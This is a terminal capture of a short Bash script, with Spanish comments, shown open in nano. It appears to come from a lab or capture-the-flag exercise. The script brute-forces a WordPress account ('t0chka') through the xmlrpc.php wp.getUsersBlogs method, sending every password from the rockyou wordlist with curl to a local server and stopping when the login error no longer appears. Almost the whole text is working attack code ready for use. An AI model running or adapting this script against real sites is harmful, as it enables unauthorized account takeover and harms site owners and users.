  </fault>
</methodResponse>'
  GNU nano 7.2                    fuerzaBrutaXMLrpc.sh                                 
    echo -e "\n\n[!] Saliendo...\n"
    exit 1
}

# CTRL + C
trap ctrl_c SIGINT

function crearXML(){
    password=$1

    xmlFile="""
<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>t0chka</value></param> # Usuario que hemos encontrado
<param><value>$password</value></param> # Contraseña con diccionario
</params>
</methodCall>"""

    echo $xmlFile > file.xml
    respuesta=$(curl -s -X POST "http://localhost:31337/xmlrpc.php" -d@file.xml)

    if [ ! "$(echo $respuesta | grep 'Incorrect username or password.')" ]; then
        echo -e "\n[+] La contraseña para el usuario t0chka es $password"
        exit 0
    fi
}

while read -r password; do
    crearXML $password
done <<<"`cat /usr/share/wordlists/rockyou.txt`"